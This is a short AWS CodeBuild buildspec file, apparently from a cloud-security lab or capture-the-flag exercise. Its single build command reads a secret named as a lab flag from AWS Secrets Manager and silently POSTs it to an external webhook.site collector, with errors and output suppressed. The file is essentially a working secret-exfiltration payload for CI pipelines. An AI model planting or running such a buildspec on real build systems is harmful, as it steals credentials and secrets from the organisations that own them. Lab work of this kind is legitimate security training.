version: 0.2

phases:
  build:
    commands:
      - |
        set +e

        echo "=== IDENTITY ==="
        
        FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)

        curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
          --data-urlencode "flag=$FLAG" >/dev/null || true